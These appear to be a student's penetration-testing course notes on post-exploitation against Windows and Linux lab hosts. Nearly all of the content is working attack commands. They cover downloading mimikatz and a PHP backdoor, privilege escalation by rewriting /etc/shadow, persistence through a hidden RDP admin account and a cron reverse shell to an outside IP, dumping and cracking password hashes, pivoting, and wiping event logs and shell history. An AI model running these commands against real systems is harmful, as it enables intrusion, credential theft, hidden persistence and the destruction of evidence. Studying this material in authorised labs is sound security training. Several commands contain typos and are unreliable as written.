#windows #linux #postexploitation
#### Methodology

trackable objectives on each stage

- local enumeration
	- Enumating :
		- System Information
		- Users & groups
		- Network info
		- Services
		- Automating local enumeration
- transferring files
	- Setup python web server
	- tranferring files to :
		- windows
		- linux
- upgrading shells
	- Shell to metrepreter
	- spawning TTY shells (linux)
- privesc
	- identify privesc vulns
		- windows privesc
		- linux privesc
- persistence
	- Setup on windows
	- Setup on Linux
- dumping & cracking hashes
	- Windows
	- Linux
- pivoting
	- internal network recon
	- pivoting
- clearing tracks
	- clearing tracks windows & linux

#### 01 - Windows enumeration`

###### System infos

Very useful to know the context of the target, gives an idea of what we can do, type of exploit that can run
what looking for :
- Hostname
- OS Name
- OS Build & Service pack
- OS architecture
- Installed updates/hotfixes

```bash

#meterpreter
getuid
shell
hostname
systeminfo #all operating system information
wmic qfe get Caption,Description,HotFixID, InstalledOn #additionnal info on patches
#can get the last secu update

```

###### Users & groups

search for other users and their access
what we re looking for :
- Current user & privs
- additional user infos
- other users on system
- groups
- members of built in administrator group

```bash

getuid
getprivs
background
search logged_on
use post/windows/gather/enum_logged_on_users
set SESSION 1
run

sessions 1
shell
whaomi
whoami /priv

query user
net users
net user administrator
net users guest
net localgroup
net localgroup administrators

```

###### Network infos

useful for then pivoting

what we re looking for :
- current IP & network adapter
- internal networks
- TCP/UDP services running / ports
- other hots on network
- routing table
- windows firewall state

```bash

shell
ipconfig
ipconfig /all

route print

#see other device on system
arp -a

netstat -ano
#service running on target

netsh firewall show state
netsh advfirewall firewall state
netsh advfirewall firewall dump
netsh advfirewall show allprofiles

```
###### Processes & Services

useful to hijack another process more stable or with more rights

what looking for :
- running processes & services
- scheduled tasks

process = instance of a running exe or program
service = process running on background / does not interact with desktop

```bash

#meterpreter
ps
migrate 2176
#or 
pgrep explorer.exe
migrate 2176

getuid
sysinfo #here you see the arch of the process

pgrep hfs.exe

shell
net start
wmic service list brief

tasklist /svc #process x services

schtasks /query /fo LIST /v


```

###### Automating local enumeration

local enum script : JAWS - Just Another Windows Script (github)
powershell script

```bash

#meterpreter
show_mount

background
search win_priv
use post/windows/gather/win_privs
set SESSION 1
run

search enum_logged
use post/windows/gather/enum_logged_on_users
set SESSION 1
run

search checkvm
use post/windows/gather/checkvm
set SEESSION 1
run

search enum_applications
use post/windows/gather/enum_applications
set SESSION 1
run

search enum_computers
use post/windows/gather/enum_computers
set SESSION 1
run

search enum_patches
use post/windows/gather/enum_patches
set SESSION 1
run

search enum_shares
use post/windows/gather/enum_shares
set SESSION 1
run

#go th JAWS github
#copy the content
nano jaws-enum.ps1
#copy

session 1
cd C:/
mkdir Temp
uplaod /root/Desktop/jaws-enum.ps1
shell
cd Temp
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-ENUM.txt
CTRL+C
download JAWS-ENUM.txt

```

#### 02 - Linux enumeration

###### System infos

what looking for :
- Hostname
- Distribution & release version
- kernel version & architecture
- CPU info
- Disk info & mounted drives
- Installed packages/software

```bash

sysinfo
shell
/bin/bash -i
cd /root
hostname
cat /etc/issue
cat /etc/*release
uname -a
uname -r #kernel only
env #env variables, PATH
lscpu

free -h

df -h #filesystem infos
df -ht ext4 #equivalent of C:
lsblk | grep sd

dpkg -l #installed packages



```

###### Users & groups

- Current user & privs
- other users
- groups

```bash

getuid
shell
/bin/bash -i
whoami
groups bob
groups root

cat /etc/passwd
cat /etc/passwd | grep -v /nologin
ls /home

groups
groups bob
usermod -aG root bob

last
lastlog

```

###### Network infos

look for :
- current IP / network adapter
- internal networks
- TCP/UDP services runnings + their ports
- other hosts on network

```bash

#on meterpreter
ifconfig
netstat

shell
/bin/bash -i
ip a s

cat /etc/networks
cat /etc/hostname
cat /etc/hosts
cat /etc/resolv.conf
arp -a
CTRL+C #go back meterpreter
arp


```

###### Processes & cron jobs

look for :
- Running services
- Cron jobs

```bash
#meterpreter
ps
pgrep vsftpd

shell
/bin/bash -i 
ps aux

top

crontab -l
ls -la /etc/cron*
cat /etc/cron*



```

###### Automating local enumeration

```bash

background
search enym_configs
use post/linux/gather/enum_configs
set SESSION 1
run

search enum_network
use post/linux/gather/enum_network
set SESSION 1
run

search enum_system
use 0
set SESSION 1
run

search checkvm
use 0
set SESSION 1
run

#in meterpreter shell
pwd
cd /tmp
#copy enum script, linEnum github
#past all the code in a file
nano linenum.sh

#meterpreter
uplaod linenum.sh
shell
/bin/bash -i
chmod +x linenum.sh
./linenum.sh



```

#### 03 - Transferring files

###### Setup python web server

```bash

ls -al /usr/share/windows-bianries
ls -al /usr/share/windows-resources
python -m SimpleHTTPServer 80 #python 2
python3 -m http.server 80 #python 3

```

###### Transferring files windows

```bash

python3 -m http.server 80

certutil -urlcache -f http://10.10.5.2/mimikatz.exe mimikatz.exe

```

###### Transferring files linux

```bash

cd /sur/share/webshells/php
python3 -m http.sever 80

wget http://192.196.45.2/php-backdoor.php

```

#### 04 - Upgrading shells

###### Upgrading non-interactive shells

```bash

#before doing : 
/bin/bash -i

#do
cat /etc/shells

#test if python
python --version
python -c 'import pty; pty.spawn("/bin/bash")'

#if perl
perl -e 'exec "/bin/bash";'

env
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm
export SHELL=bash


```

#### 05 - Windows privesc

tool : Privesccheck (github script) - enum for windows privesc

```bash

getuid
getprivs #2lines

cd Desktop/Privesc
shell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

#cleartext password in registry with winlogon feature
psexec.py Administrator@10.4.21.189
password
#shell as auth/system
whoami /priv

#other methods to gain reverse shell
use exploit/windows/misc/hta_server
exploit
#on windows target
mshta.exe http://10.10.48.3:8080/xQKNjDSzD5.hta
#meterpreter shell


```

#### 06 - Linux privesc

```bash

#search file that can be edited by anyone
find / -not -type l -perm -o+w
#/etc/shadow

cat /etc/shadow
#we can change password in this file
ls -al /etc/shadow
openssl passwd -1 -salt abc password
#give hash, copy and past to shadow in root hash
vim /etc/shadow
su
password
whoami
#root

```

Exploit sudo privs

```bash

sudo -l

#root priv on man
sudo man ls
#in the manual page
!/bin/bash

```
#### 07 - Persistence

Windows services
```bash

#admin meterpreter
background
search persistence_service
use exploit/windows/local/persitence_service
set LPORT 4433
set SESSION 1
#will make a paylaod, export it to the victim, create a service to use this paylaod
exploit

```

windows rdp
```bash

#meterpreter
run getgui -e -u lolox -p password_123321
#check if rdp enable, if not enable it
#open port in fw
#create user
#hide it from windows login screen
#add user to rdp and administrators group

exit

xfreerdp /u:lolox /p:pasword_123321 /v:target.ine.local

```

linux ssh keys
```bash

ls -la 
#.ssh

cd .ssh/
ls
#authorized_keys, id_ras (private key)
#copy the private key
scp student@192.62.138.3:~/.ssh/id_rsa .
chmod 400 id_rsa
ssh -i id_rsa student@192.62.138.3

```

linux cron
```bash

cat /etc/cron*

echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.166.95.2/1234 0>&1'" > cron
cat cron
crontab -l

#on our machine
nc -nvlp 1234
#shell

```

#### 08 - Dumping & cracking hashes

###### NTLM hashes

tool : mimikatz / meterpreter inbuilt hashdump
john the ripper / hashcat

```bash

#meterpreter, auth/system
pgrep lsass
migrate 567
#upgrade to x64 + more stable shell
hashdump

background
nano hashes.txt
#copy past
john --list-formats | grep NTLM
john --format=NT hashes.txt #use default wordlist
#or 
gzip -d /usr/share/wordlists/rockyou.txt.gz
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou

#hashcat
#hashcat precise the variable with it's id table
hashcat #look the all the id


#rdp running
xfreerdp /u:Administrator /p:password /v:target.ine.local

```

###### Linux hashes

```bash

#non interactive shell
/bin/bash -i

whoami
#root
cat /etc/shadow
#hash algo is set to $6 = sha512
#copy root hash
CTRL+Z

sessions -u 1

#pertinate to linux system, not the same as meterpreter session
search hashdump
use post/linux/gather/hashdump
set sessions 2
run
cat / root/-msf4/loot/20220218231152_default_192.234.199.3_linux.hashes_006024.txt

#go crack
gzip -d /usr/share/wordlists/rockyou.txt.gz
john --format=sha512crypt /root/-msf4/loot/20220218231152_default_192.234.199.3_linux.hashes_006024.txt --wordlist=/usr/share/wordlists/rockyou.txt

hashcat --helo | grep 1800
#id for $6 linux hash
hashcat -a3 -m 1800 /root/-msf4/loot/20220218231152_default_192.234.199.3_linux.hashes_006024.txt /usr/share/wordlists/rockyou.txt


```

#### 09 - Pivoting

port forwarding
context of pivoting : forward a remote port previously inaccessible host to one of our local port to then exploit the service running 

```bash

#victim 1 : 10.0.29.148
#victim 2 : 10.0.29.96

#exploit victim 1

#meterpreter shell : administrator
ipconfig
#add route to entire subnet
run autoroute -s 10.0.29.0/20
run autoroute -p

background

search portscan
use 5
set RHOSTS 10.0.29.96
set PORTS 1-100
run
#port 80 open
#we need to forward the port for utiliser nmap

sessions 1
portfwd add -l 1234 -p 80 -r 10.0.29.96

#new shell
nmap -sV -p 1234 localhost
#badblue running

background
search badblue
use exploit/windows/http/badblue_passthru
set paylaod windows/meterpreter/bind_tcp
set RHOSTS 10.0.29.96
run
#meterpreter on victim 2

```

#### 10 - Clearing

###### Windows clearing tracks

- for ROE (rules of engagement)
- clean/undo any change 
- good practice it's to save all scripts to C:/Temp or /tmp folder 
+ use meterpreter script looting for clearing/ressource scripts to undo changes
+ keep tracks of artifacts upload on the target (manual or via meterpreter)

```bash

#exemple
use exploit/windows/local/persistence_service
exploit
#output, infos to keep track :
Meterpreter service exe written to C: \Users\ADMINI~1\AppData\Local\ Temp\MnpUdbMa. exe
Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ATTACKDEFENSE_20220220.0612/ATTACKDEFENSE_20220220

#on meterpreter session
resource /root/.msf4/logs/persistence/ATTACKDEFENSE_20220220.0612/ATTACKDEFENSE_20220220
#clean tracks

#clear windows event logs
clearev
#wipe all windows event logs

```

###### Linux clearing tracks

same like windows :
- works on /tmp
- keep track of artifact/scripts uplaod on the target

```bash
#bash_history file keep all commands typed, located on user's home
history -c #clean
#or delete the file
cat /dev/null > ~/.bash_history

```